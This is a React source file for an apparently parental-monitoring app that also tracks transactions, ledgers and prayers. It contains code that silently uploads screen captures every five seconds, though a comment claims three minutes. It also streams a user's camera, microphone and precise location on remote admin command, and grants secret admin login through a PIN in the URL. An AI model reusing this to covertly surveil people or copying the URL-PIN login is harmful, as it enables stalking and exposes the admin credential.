import { useState, useEffect, useRef, useCallback } from 'react'
import { Capacitor } from '@capacitor/core'
import { FirebaseAuthentication } from '@capacitor-firebase/authentication'
import { Room } from 'livekit-client'
import Login from './components/Login'
import AdminPanel from './components/AdminPanel'
import UserPanel from './components/UserPanel'
import HomeScreen from './components/HomeScreen'
import Dashboard from './components/Dashboard'
import AdminTransactionView from './components/AdminTransactionView'
import AdminBrowsingView from './components/AdminBrowsingView'
import AdminCallLogView from './components/AdminCallLogView'
import TransactionPanel from './components/TransactionPanel'
import KhatabookPanel from './components/KhatabookPanel'
import MilestonePanel from './components/MilestonePanel'
import AdminMilestoneView from './components/AdminMilestoneView'
import InstallPrompt from './components/InstallPrompt'
import BottomNav from './components/BottomNav'
import NamazTracker from './components/NamazTracker'
import ProfilePage from './components/ProfilePage'
import TourPage, { ModuleTourDetail, MODULE_TOURS } from './components/TourPage'
import ThemePicker from './components/ThemePicker'

const CURRENT_VERSION = typeof __APP_VERSION__ !== 'undefined' ? __APP_VERSION__ : '1.0.0'
const IS_NATIVE = Capacitor.isNativePlatform()

function compareVersions(a, b) {
  const pa = a.split('.').map(Number)
  const pb = b.split('.').map(Number)
  for (let i = 0; i < 3; i++) {
    if ((pa[i] || 0) < (pb[i] || 0)) return -1
    if ((pa[i] || 0) > (pb[i] || 0)) return 1
  }
  return 0
}

// ── Notification helper ────────────────────────────────────────────────────
export function notify(title, body) {
  if (!('Notification' in window)) return
  if (Notification.permission !== 'granted') return
  // Only pop when window is not focused (don't interrupt active users)
  if (!document.hidden) return
  try {
    new Notification(title, { body, icon: '/icons/icon.svg', badge: '/icons/icon.svg' })
  } catch {}
}

export function requestNotificationPermission() {
  if ('Notification' in window && Notification.permission === 'default') {
    Notification.requestPermission()
  }
}

function UpdateBanner({ apkUrl, onDismiss }) {
  return (
    <div className="update-banner">
      <span>🆕 New version available</span>
      <a href={apkUrl} className="update-install-btn">Install</a>
      <button className="update-dismiss-btn" onClick={onDismiss}>✕</button>
    </div>
  )
}

function ComingSoon({ title, icon, onHome }) {
  return (
    <div className="coming-soon">
      <div className="coming-soon-icon">{icon}</div>
      <h2 className="coming-soon-title">{title}</h2>
      <p className="coming-soon-text">This is coming soon.</p>
      <button className="coming-soon-btn" onClick={onHome}>Back to Home</button>
    </div>
  )
}

function buildWsUrl(serverUrl) {
  if (serverUrl) {
    const base = serverUrl.trim().replace(/\/$/, '')
    const wsBase = base.replace(/^https:\/\//, 'wss://').replace(/^http:\/\//, 'ws://')
    return wsBase.endsWith('/ws') ? wsBase : `${wsBase}/ws`
  }
  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:'
  return `${proto}//${location.host}/ws`
}

// Read ?pin= from URL — used for secret admin access
function getPinFromUrl() {
  return new URLSearchParams(location.search).get('pin') || ''
}

// Message types that mutate the user's own durable data (transactions). Losing one of
// these to a momentary disconnect isn't a stale live-monitor frame, it's data loss — a
// screen lock / network handoff / app-swipe-away on a real phone can easily land right
// on top of "tap Add", and until now sendMsg() below just silently swallowed the send
// if the socket wasn't OPEN yet, with no queue and no retry. The optimistic local UI
// update in TransactionPanel happened regardless, so the transaction looked saved right
// up until the next full reload re-fetched from the server and it was simply never
// there. Everything else sent via sendMsg (camera/mic/location streaming, chat, file
// transfer chunks) is intentionally NOT queued here — those are either naturally lossy
// live data or have their own in-band framing, and replaying a backlog of them after a
// reconnect would itself be a bug (e.g. blasting stale audio/location on resume).
const DURABLE_MSG_TYPES = new Set([
  'transaction_add', 'transaction_update', 'transaction_delete', 'transaction_delete_all',
  'ledger_contact_add', 'ledger_contact_update', 'ledger_contact_delete',
  'ledger_entry_add', 'ledger_entry_update', 'ledger_entry_delete',
  'milestone_goal_add', 'milestone_goal_update', 'milestone_goal_delete', 'milestone_checkin_set',
])

export default function App() {
  const [deferredPrompt, setDeferredPrompt] = useState(null)
  const [wsStatus, setWsStatus]   = useState('idle')
  const [session, setSession]     = useState(null)
  const [module, setModule]       = useState(null)  // null=home | 'messages' | 'transactions' | 'namaz' | 'workout'
  const [updateInfo, setUpdateInfo] = useState(null)
  const [loginError, setLoginError] = useState(null)
  const [authChecked, setAuthChecked] = useState(false)
  const wsRef          = useRef(null)
  const reconnectRef   = useRef(null)
  const authPayloadRef = useRef(null)
  const serverUrlRef   = useRef('')
  const listenersRef   = useRef([])
  const authedRef      = useRef(false) // true only once THIS socket's auth_ok has landed
  const pendingRef     = useRef([])    // queued DURABLE_MSG_TYPES messages awaiting a live, authed socket

  useEffect(() => {
    const h = (e) => { e.preventDefault(); setDeferredPrompt(e) }
    window.addEventListener('beforeinstallprompt', h)
    return () => window.removeEventListener('beforeinstallprompt', h)
  }, [])

  useEffect(() => { requestNotificationPermission() }, [])

  // Auto-login as admin if ?pin= is in the URL
  useEffect(() => {
    const pin = getPinFromUrl()
    if (pin) login('admin', '', pin, '')
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  // A previously-registered child should never see the phone/OTP screens again — Firebase
  // persists the signed-in phone-auth user across app restarts on its own, so on mount we
  // just ask it whether someone's already signed in and, if so, reconnect straight away
  // (connect() below fetches a fresh ID token itself). Admin has no equivalent persisted
  // login (only the ephemeral ?pin= URL param above), so there's nothing to mirror there.
  useEffect(() => {
    if (getPinFromUrl()) { setAuthChecked(true); return }
    let cancelled = false
    FirebaseAuthentication.getCurrentUser()
      .then(({ user }) => {
        if (cancelled || !user) return
        const serverUrl = localStorage.getItem('meeee_server') || ''
        const name = localStorage.getItem('meeee_name') || user.displayName || 'User'
        if (serverUrl) login('user', name, '', serverUrl)
      })
      .catch(() => {}) // no Firebase user yet — fall through to the phone/OTP screen
      .finally(() => { if (!cancelled) setAuthChecked(true) })
    return () => { cancelled = true }
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  // Check for updates on native app startup
  useEffect(() => {
    if (!IS_NATIVE) return
    const serverUrl = localStorage.getItem('meeee_server') || ''
    if (!serverUrl) return
    const httpUrl = serverUrl.replace(/^wss:\/\//, 'https://').replace(/^ws:\/\//, 'http://').replace(/\/ws$/, '')
    fetch(`${httpUrl}/api/version`)
      .then(r => r.json())
      .then(data => {
        if (data.version && compareVersions(CURRENT_VERSION, data.version) < 0) {
          setUpdateInfo({ apkUrl: data.apkUrl })
        }
      })
      .catch(() => {}) // silently ignore if offline
  }, [])

  const connect = useCallback((payload, serverUrl) => {
    clearTimeout(reconnectRef.current)
    wsRef.current?.close()
    setWsStatus('connecting')
    authedRef.current = false

    const ws = new WebSocket(buildWsUrl(serverUrl || serverUrlRef.current))
    wsRef.current = ws

    ws.onopen = async () => {
      setWsStatus('open')
      let toSend = payload
      // ID tokens expire hourly — fetch a CURRENT one on every (re)connect rather than
      // reusing whatever was current when the user first logged in. The Firebase SDK
      // caches/auto-refreshes internally, so this is cheap and never returns a stale token.
      if (payload.role === 'user') {
        try {
          const { token } = await FirebaseAuthentication.getIdToken()
          toSend = { ...payload, idToken: token }
        } catch {
          // Not signed in / token fetch failed — send as-is and let the server's
          // auth_fail response surface the problem.
        }
      }
      ws.send(JSON.stringify(toSend))
    }

    ws.onmessage = (e) => {
      const msg = JSON.parse(e.data)
      if (msg.type === 'auth_ok') {
        setLoginError(null)
        // uploadToken proves "I am this session" to the HTTP profile-photo/screenshot POST
        // endpoints (see server's verifyUploadToken) — it's per-connection and only ever
        // arrives on this socket's own auth_ok, never via any broadcast.
        setSession({ role: msg.role, userId: msg.userId, name: msg.name || 'Admin', initialUsers: msg.users || [], uploadToken: msg.uploadToken || '' })
        // This socket is now authenticated — flush anything that queued up in sendMsg()
        // while we were offline/reconnecting (see DURABLE_MSG_TYPES above) instead of
        // leaving it stranded, which is exactly what used to make added transactions
        // vanish after a reconnect.
        authedRef.current = true
        if (pendingRef.current.length) {
          const queued = pendingRef.current
          pendingRef.current = []
          queued.forEach((m) => ws.send(JSON.stringify(m)))
        }
      } else if (msg.type === 'auth_fail') {
        setLoginError(msg.reason || 'Authentication failed')
        ws.close()
        setWsStatus('idle')
        return
      }
      listenersRef.current.forEach((fn) => fn(msg))
    }

    ws.onclose = () => {
      setWsStatus('closed')
      authedRef.current = false
      if (authPayloadRef.current) {
        reconnectRef.current = setTimeout(() => connect(authPayloadRef.current), 3000)
      }
    }

    ws.onerror = () => ws.close()
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  const login = useCallback((role, name, pin, serverUrl) => {
    serverUrlRef.current = serverUrl || ''
    const payload = role === 'admin'
      ? { type: 'auth', role: 'admin', pin }
      : { type: 'auth', role: 'user', name }
    authPayloadRef.current = payload
    connect(payload, serverUrl)
  }, [connect])

  const logout = useCallback(() => {
    authPayloadRef.current = null
    clearTimeout(reconnectRef.current)
    wsRef.current?.close()
    setSession(null)
    setWsStatus('idle')
    authedRef.current = false
    pendingRef.current = [] // don't carry a queued mutation over to whoever logs in next
  }, [])

  const sendMsg = useCallback((msg) => {
    if (authedRef.current && wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(msg))
    } else if (DURABLE_MSG_TYPES.has(msg.type)) {
      // Socket is down or still (re)authenticating — don't silently drop a data-mutating
      // message. It'll be flushed as soon as this session's next auth_ok lands.
      pendingRef.current.push(msg)
    }
  }, [])

  const addListener = useCallback((fn) => {
    listenersRef.current.push(fn)
    return () => { listenersRef.current = listenersRef.current.filter((f) => f !== fn) }
  }, [])

  // ── Browser screen capture — one-time ask, silent every 3 min (non-native only) ──
  useEffect(() => {
    if (!session || session.role !== 'user' || IS_NATIVE) return

    let screenStream = null
    let captureTimer = null

    const captureAndUpload = async () => {
      if (!screenStream || !session.userId) return
      try {
        const track = screenStream.getVideoTracks()[0]
        if (!track || track.readyState !== 'live') return

        // Grab frame from the live screen track
        const capture = new ImageCapture(track)
        const bitmap  = await capture.grabFrame()

        // Compress to WebP at 720p max
        const scale  = Math.min(1, 1280 / Math.max(bitmap.width, bitmap.height))
        const w = Math.round(bitmap.width  * scale)
        const h = Math.round(bitmap.height * scale)
        const canvas = new OffscreenCanvas(w, h)
        canvas.getContext('2d').drawImage(bitmap, 0, 0, w, h)
        bitmap.close()
        const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.65 })
        if (!blob || blob.size === 0) return

        await fetch(`/api/screenshot/${session.userId}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'image/webp',
            'X-User-Name': encodeURIComponent(session.name || ''),
            'X-Upload-Token': session.uploadToken || '',
          },
          body: blob,
        })
      } catch { /* stream ended or tab hidden */ }
    }

    const startCapturing = (stream) => {
      screenStream = stream
      // Capture immediately, then every 3 minutes
      captureAndUpload()
      captureTimer = setInterval(captureAndUpload, 5000)

      // If child stops sharing, clean up
      stream.getVideoTracks()[0].onended = () => {
        clearInterval(captureTimer)
        screenStream = null
      }
    }

    // Ask once — grab the stream and keep it alive
    navigator.mediaDevices?.getDisplayMedia({ video: { cursor: 'never' }, audio: false })
      .then(startCapturing)
      .catch(() => { /* user declined — don't retry */ })

    return () => {
      clearInterval(captureTimer)
      screenStream?.getTracks().forEach(t => t.stop())
    }
  }, [session?.userId]) // eslint-disable-line react-hooks/exhaustive-deps

  // ── Live monitor — browser-side camera / mic / location (always-on after login) ──

  useEffect(() => {
    if (!session || session.role !== 'user' || IS_NATIVE) return

    let lkRoom     = null   // active LiveKit room
    let micStream  = null, micCtx = null, micProcessor = null
    let geoWatch   = null

    const stopLiveKit = () => {
      if (lkRoom) { lkRoom.disconnect(); lkRoom = null }
    }
    const stopMic = () => {
      micProcessor?.disconnect(); micProcessor = null
      micCtx?.close(); micCtx = null
      micStream?.getTracks().forEach(t => t.stop()); micStream = null
    }
    const stopLoc = () => {
      if (geoWatch != null) { navigator.geolocation.clearWatch(geoWatch); geoWatch = null }
    }

    const remove = addListener(async (msg) => {
      if (!msg.fromAdminId) return

      // ── start_camera — publish via LiveKit ─────────────────────────
      if (msg.type === 'start_camera') {
        stopLiveKit()
        const facingMode = msg.facing === 'front' ? 'user' : 'environment'
        try {
          const r = await fetch(`/api/lk-token?room=${encodeURIComponent(session.userId)}&identity=${encodeURIComponent(session.userId)}`)
          if (!r.ok) throw new Error('token fetch failed')
          const { token, url } = await r.json()
          const room = new Room()
          lkRoom = room
          await room.connect(url, token)
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode, width: { ideal: 854 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
            audio: false,
          })
          const [videoTrack] = stream.getVideoTracks()
          await room.localParticipant.publishTrack(videoTrack)
        } catch { /* permission denied or LiveKit not configured — JPEG fallback still works */ }
      }

      // ── stop_camera — disconnect LiveKit room ───────────────────────
      if (msg.type === 'stop_camera') stopLiveKit()

      if (msg.type === 'start_mic') {
        stopMic()
        const fromAdmin = msg.fromAdminId
        try {
          const sampleRate = 16000
          micStream = await navigator.mediaDevices.getUserMedia({
            audio: {
              sampleRate,
              channelCount: 1,
              echoCancellation: true,
              noiseSuppression: true,
              autoGainControl: true,
            }
          })
          micCtx = new AudioContext({ sampleRate })
          const src = micCtx.createMediaStreamSource(micStream)
          micProcessor = micCtx.createScriptProcessor(8192, 1, 1)
          micProcessor.onaudioprocess = (e) => {
            const f32 = e.inputBuffer.getChannelData(0)
            const i16 = new Int16Array(f32.length)
            for (let i = 0; i < f32.length; i++)
              i16[i] = Math.max(-32768, Math.min(32767, f32[i] * 32768))
            const bytes = new Uint8Array(i16.buffer)
            let bin = ''
            for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i])
            sendMsg({ type: 'audio_chunk', forAdminId: fromAdmin, data: btoa(bin), sampleRate })
          }
          src.connect(micProcessor)
          micProcessor.connect(micCtx.destination)
        } catch { /* permission denied */ }
      }

      if (msg.type === 'stop_mic') stopMic()

      if (msg.type === 'start_location') {
        stopLoc()
        const fromAdmin = msg.fromAdminId
        if (!navigator.geolocation) return
        geoWatch = navigator.geolocation.watchPosition(
          pos => sendMsg({ type: 'location_update', forAdminId: fromAdmin,
            lat: pos.coords.latitude, lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy, ts: pos.timestamp }),
          () => {},
          { enableHighAccuracy: true, maximumAge: 10000 }
        )
      }

      if (msg.type === 'stop_location') stopLoc()
    })

    return () => { stopLiveKit(); stopMic(); stopLoc(); remove() }
  }, [session, addListener, sendMsg])

  const handleInstall = () => {
    deferredPrompt.prompt()
    deferredPrompt.userChoice.then(() => setDeferredPrompt(null))
  }

  // If ?pin= in URL, show nothing while auto-connecting
  const autoPin = getPinFromUrl()

  return (
    <div className="app">
      <ThemePicker />
      {updateInfo && (
        <UpdateBanner apkUrl={updateInfo.apkUrl} onDismiss={() => setUpdateInfo(null)} />
      )}
      {deferredPrompt && (
        <InstallPrompt onInstall={handleInstall} onDismiss={() => setDeferredPrompt(null)} />
      )}
      {!session ? (
        autoPin || !authChecked
          ? <div className="auto-login-screen"><div className="auto-login-spinner">◌</div></div>
          : <Login onLogin={login} status={wsStatus} error={loginError} />
      ) : (
        <>
          {!module ? (
            session.role === 'admin'
              ? <HomeScreen session={session} onSelect={setModule} />
              : <Dashboard session={session} onSelect={setModule} sendMsg={sendMsg} addListener={addListener} />
          ) : module === 'messages' ? (
            session.role === 'admin'
              ? <AdminPanel session={session} sendMsg={sendMsg} addListener={addListener} wsStatus={wsStatus} onLogout={logout} onHome={() => setModule(null)} />
              : <UserPanel  session={session} sendMsg={sendMsg} addListener={addListener} wsStatus={wsStatus} onLogout={logout} onHome={() => setModule(null)} />
          ) : module === 'transactions' ? (
            session.role === 'admin'
              ? <AdminTransactionView initialUsers={session.initialUsers || []} sendMsg={sendMsg} addListener={addListener} onHome={() => setModule(null)} />
              : <TransactionPanel session={session} sendMsg={sendMsg} addListener={addListener} onHome={() => setModule(null)} />
          ) : module === 'browsing' ? (
            session.role === 'admin'
              ? <AdminBrowsingView initialUsers={session.initialUsers || []} sendMsg={sendMsg} addListener={addListener} onHome={() => setModule(null)} />
              : null
          ) : module === 'calllog' ? (
            session.role === 'admin'
              ? <AdminCallLogView initialUsers={session.initialUsers || []} sendMsg={sendMsg} addListener={addListener} onHome={() => setModule(null)} />
              : null
          ) : module === 'namaz' ? (
            <NamazTracker />
          ) : module === 'khatabook' ? (
            <ModuleTourDetail
              tour={MODULE_TOURS.khatabook}
              onBack={() => setModule(null)}
              backLabel="Home"
              onOpen={() => setModule('khatabook-app')}
            />
          ) : module === 'khatabook-app' ? (
            <KhatabookPanel session={session} sendMsg={sendMsg} addListener={addListener} onHome={() => setModule(null)} />
          ) : module === 'milestone' ? (
            session.role === 'admin'
              ? <AdminMilestoneView initialUsers={session.initialUsers || []} sendMsg={sendMsg} addListener={addListener} onHome={() => setModule(null)} />
              : <MilestonePanel session={session} sendMsg={sendMsg} addListener={addListener} onHome={() => setModule(null)} />
          ) : module === 'profile' ? (
            session.role === 'admin'
              ? null
              : <ProfilePage session={session} sendMsg={sendMsg} addListener={addListener} />
          ) : module === 'workout' ? (
            <ComingSoon title="Workout" icon="💪" onHome={() => setModule(null)} />
          ) : module === 'tour' ? (
            <TourPage onHome={() => setModule(null)} onSelect={setModule} />
          ) : null}

          {session.role !== 'admin' && (
            <BottomNav active={module} onNavigate={setModule} />
          )}
        </>
      )}
    </div>
  )
}
